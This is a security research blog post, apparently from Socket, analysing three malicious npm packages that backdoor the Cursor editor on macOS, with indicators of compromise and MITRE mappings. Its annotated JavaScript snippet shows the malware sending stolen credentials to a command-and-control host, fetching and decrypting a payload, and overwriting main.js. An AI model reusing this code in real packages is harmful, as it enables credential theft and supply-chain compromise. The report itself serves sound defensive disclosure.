---
title: "Backdooring the IDE: Malicious npm Packages Hijack Cursor Editor on macOS"
short_title: "Malicious npm Packages Hijack Cursor Editor on macOS"
date: 2025-05-07 12:00:00 +0000
categories: [Malware, npm]
tags: [npm, JavaScript, Cursor, macOS, Backdoor, T1195.002, T1059.007, T1608.001, T1204.002, T1027.013, T1574, T1071.001, T1041]
canonical_url: https://socket.dev/blog/malicious-npm-packages-hijack-cursor-editor-on-macos
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/6ed8aa3b7af41a504cc1e7ad0897d8a03b6c109f-1024x1024.webp
  alt: "Backdooring the IDE: Malicious npm Packages Hijack Cursor Editor on macOS"
description: "Malicious npm packages posing as developer tools target macOS Cursor IDE users, stealing credentials and modifying files to gain persistent backdoor access."
---

The Socket Threat Research Team has identified three malicious npm packages — [`sw‑cur`](https://socket.dev/npm/package/sw-cur/overview/2.6.0), its near-identical clone [`sw‑cur1`](https://socket.dev/npm/package/sw-cur1/overview/1.4.0), and [`aiide-cur`](https://socket.dev/npm/package/aiide-cur/files/1.9.2/index.js) — targeting the macOS version of the popular [Cursor AI code editor](https://www.cursor.com/en). Disguised as developer tools offering "the cheapest Cursor API", these packages steal user credentials, fetch an encrypted payload from threat actor-controlled infrastructure, overwrite Cursor's `main.js` file, and disable auto-updates to maintain persistence.

Published by a threat actor using the npm aliases `gtr2018` and `aiide` (registered under the email addresses `404228858@qq[.]com` and `touzi_xiansheng@outlook[.]com`), the packages function as backdoors, and by the time of discovery, they had already been downloaded more than 3,200 times. As of this writing, these packages remain live on the npm registry. We have formally petitioned for their removal.

![Malicious npm packages sw-cur and sw-cur1](https://cdn.sanity.io/images/cgdhsj6q/production/346734c40e9513da5bbdf086bd09a01681cf265f-385x423.png)
_Malicious npm packages `sw‑cur` and `sw‑cur1` [published](https://socket.dev/npm/user/gtr2018) by `gtr2018`. The summary under the `sw-cur` package "提供全网最便宜的Cursor接口服务-升维科技" translates from Chinese to: "Providing the cheapest Cursor API service on the entire internet – Shengwei Technology"_

This campaign highlights a growing supply chain threat, with threat actors increasingly using malicious patches to compromise trusted local software. Our findings align with research by ReversingLabs' Lucija Valentić, who documented npm-based attacks where malicious packages [infected](https://www.reversinglabs.com/blog/malicious-npm-patch-delivers-reverse-shell) [other](https://www.reversinglabs.com/blog/atomic-and-exodus-crypto-wallets-targeted-in-malicious-npm-campaign) locally-installed legitimate packages. Together, these investigations reinforce a clear and expanding pattern — stealthy, patch-based compromises delivered through widely used package managers like npm.

Building on that trend, we are now seeing a new vector emerge: the use of npm malware to directly backdoor developer tools like integrated development environments (IDEs). This approach leverages the trust developers place in their environments, embedding persistent access within the tools they use to write and ship code.

## Under the Hood of the Malicious Packages

When executed, the malicious script in the `sw‑cur`, `sw‑cur1`, and `aiide-cur` packages harvests user-supplied credentials, retrieves an encrypted secondary payload from threat actor-controlled infrastructure, decrypts and decompresses it, and replaces critical Cursor-specific code with attacker-controlled logic. The `sw‑cur` package also disables Cursor's auto-update mechanism; and all packages restart the application, granting the threat actor persistent, remote-controlled execution within the user's IDE.

![Execution flow diagram of sw-cur](https://cdn.sanity.io/images/cgdhsj6q/production/6eba6c2290bcd4122c82c2fab90ed874d8e31f20-449x445.png)
_Execution flow diagram of the malicious `sw-cur` package._

![Cursor AI code editor homepage](https://cdn.sanity.io/images/cgdhsj6q/production/a19052c547fc0196a48bfc23ff6bf81c26ff3673-1619x496.png)
_Official [homepage](https://www.cursor.com/en) of the Cursor AI code editor. The attack specifically targets macOS installations of this application by modifying internal files such as `main.js` under the `/Applications/Cursor.app/...` path. The malware uses the editor's trusted runtime to execute threat actor-controlled code and maintain persistence._

Below are defanged and annotated code snippets that illustrate the core backdoor logic common to all three variants — [`sw‑cur`](https://socket.dev/npm/package/sw-cur/files/2.6.0/index.js), [`sw‑cur1`](https://socket.dev/npm/package/sw-cur1/files/1.4.0/index.js), and [`aiide‑cur`](https://socket.dev/npm/package/aiide-cur/files/1.9.2/index.js). Only the hardcoded domains and (in the case of `sw‑cur1` and `aiide‑cur`) the final `disableAutoUpdate()` call differ; the credential exfiltration, encrypted loader retrieval, decryption routine, and file‑patch sequence are otherwise identical.

```javascript
// 1. Send stolen credentials to C2 server at cursor[.]sw2031[.]com
const url = `${webHost}/api/login?username=${u}&password=${p}&t=${Date.now()}`;
await httpRequest('GET', url);

// 2. Download and decrypt second stage payload
const res = await httpRequest('GET', `${apiHost}/j?t=${Date.now()}`);
const buf = Buffer.from(JSON.parse(res).data, 'base64');
const stage2 = await gunzip(await aesDecrypt(buf, hardCodedKey));

// 3. Overwrite Cursor's main.js and disable updates
const target = '/Applications/Cursor.app/Contents/Resources/app/extensions/cursor-always-local/dist/main.js';
fs.copyFileSync(target, `${target}.bak`);       // create backup
fs.writeFileSync(target, stage2.toString()      // inject backdoor
                       .replace('test:123456', `${u}:${p}`));
disableAutoUpdate();                            // disable auto-update
```

The malicious packages follow the same core flow but use different infrastructure. In `sw‑cur` and `sw‑cur1`, the script URL‑encodes the user's Cursor credentials and sends them via a GET request to `/api/login` on `cursor[.]sw2031[.]com` — a site that presents a generic ElementAdmin login page to appear harmless. In the `aiide‑cur` variant, the same request goes to `aiide[.]xyz/api/login`.

Next, the script downloads an AES‑encrypted, gzip‑compressed JavaScript loader: `sw‑cur` pulls it from `t[.]sw2031[.]com`, while `aiide‑cur` uses `api[.]aiide[.]xyz`. All three packages rely on the identical 32‑byte key [`a8f2e9c4b7d6m3k5n1p0q9r8s7t6u5v4`](https://socket.dev/npm/package/sw-cur/files/2.6.0/index.js#L126) for decryption. After decrypting and decompressing the payload, the code backs up the legitimate `main.js` at `/Applications/Cursor.app/Contents/Resources/app/extensions/cursor-always-local/dist/`, injects the stolen credentials into the payload, and overwrites the original file — trojanizing the local Cursor installation.

Persistence logic differs slightly: `sw‑cur` disables Cursor's auto‑update mechanism and kills [`chrome_crashpad_handler`](https://socket.dev/npm/package/sw-cur/files/2.6.0/index.js#L187) and all Cursor processes so the patched binary loads on the next launch. `sw‑cur1` and `aiide‑cur` omit the auto‑update tweak and process‑kill step but still instructs the user to restart Cursor, which activates the backdoored `main.js`.

![Socket AI Scanner analysis of sw-cur](https://cdn.sanity.io/images/cgdhsj6q/production/eb117fe82846bb7c31409ee5c272db6cc6442357-565x579.png)
_Socket AI Scanner's analysis, including contextual details about the malicious `sw‑cur` package._

## Abusing the "Cheapest API" Bait

The malicious packages `sw-cur`, `sw-cur1`, and `aiide‑cur` appear to exploit developers' interest in avoiding Cursor's AI usage fees. As an AI-first IDE, Cursor offers tiered access to large language models — such as Claude, Gemini, and GPT-4 — with premium model invocations priced per request (e.g., $0.30 each for OpenAI's latest reasoning model, o3). While users can bring their own API keys, some may seek cheaper or unofficial integrations to reduce costs. The threat actor's use of the tagline "the cheapest Cursor API" likely targets this group, luring users with the promise of discounted access while quietly deploying a backdoor.

![Cursor AI agent interface](https://cdn.sanity.io/images/cgdhsj6q/production/1741373bb8aeb877b848507f91f5963273091f52-672x822.png)
_This screenshot shows Cursor's built-in AI agent [interface](https://docs.cursor.com/settings/models#max), where users can choose from premium language models. The malicious npm packages `sw-cur`, `sw-cur1`, and `aiide‑cur` advertise "the cheapest Cursor API", likely to lure developers looking to avoid these costs._

## Impact Assessment

For individual users, the compromised IDE poses a direct risk of credential theft, code exfiltration, and potential delivery of additional malware. Once the threat actor obtains Cursor credentials, they can access paid services and, more critically, any codebase the victim opens within the IDE. Because the injected code runs with the user's privileges, it can execute further malicious scripts or extract sensitive data without detection.

In enterprise environments or open source projects, the risks multiply. A trojanized IDE on a developer's machine can leak proprietary source code, introduce malicious dependencies into builds, or serve as a foothold for lateral movement within CI/CD pipelines. Since the malicious patch disables Cursor's auto-update mechanism, it can remain active for extended periods.

## Outlook and Recommendations

The `sw-cur`, `sw-cur1`, and `aiide‑cur` malicious packages target macOS developers using the Cursor AI IDE by modifying trusted application files, stealing credentials, and embedding a persistent backdoor. Their design demonstrates a deliberate attempt to exploit developer workflows and IDE trust boundaries to gain long-term access and control. It is an attack on the very tool developers trust to write secure code.

For organizations that suspect exposure, we recommend restoring Cursor from a verified installer, rotating all affected credentials, and auditing source control and build artifacts for signs of unauthorized changes.

Socket's free tools detect and block threats like these before they reach production environments. By analyzing package behavior in real time — rather than relying solely on static signatures — Socket can flag dangerous patterns such as credential prompts during installation, filesystem access to protected application paths, and outbound requests to malicious and suspicious domains.

Socket's [GitHub app](https://socket.dev/features/github) automatically surfaces these risks in pull requests, giving developers visibility into potential supply chain attacks before dependencies are merged. During development, the [Socket CLI](https://socket.dev/features/cli) alerts users when they attempt to install packages that exhibit suspicious behavior, such as writing to IDE directories or executing post-install scripts. During dependency research, the [Socket browser extension](https://socket.dev/features/web-extension) surfaces real-time security insights directly on package pages, flagging suspicious behavior, known malware, and potential typosquats before developers install or include them in their projects.

## Indicators of Compromise (IOCs)

### Malicious npm Packages

- [`sw‑cur`](https://socket.dev/npm/package/sw-cur/overview/2.6.0)
- [`sw‑cur1`](https://socket.dev/npm/package/sw-cur1/overview/1.4.0)
- [`aiide‑cur`](https://socket.dev/npm/package/aiide-cur/overview/1.9.2)

### Threat Actor Identifiers

- `gtr2018` — npm alias
- `aiide` — npm alias
- `404228858@qq[.]com` — email address
- `touzi_xiansheng@outlook[.]com` — email address

### C2 Endpoints

- `cursor[.]sw2031[.]com`
- `cursor[.]sw2031[.]com/api/login`
- `t[.]sw2031[.]com`
- `aiide[.]xyz/api/login`
- `aiide[.]xyz`

### AES Key

- `a8f2e9c4b7d6m3k5n1p0q9r8s7t6u5v4`

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.007 — Command & Scripting Interpreter: JavaScript
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1574 — Hijack Execution Flow
- T1071.001 — Application Layer Protocol: Web Protocols
- T1041 — Exfiltration Over C2 Channel
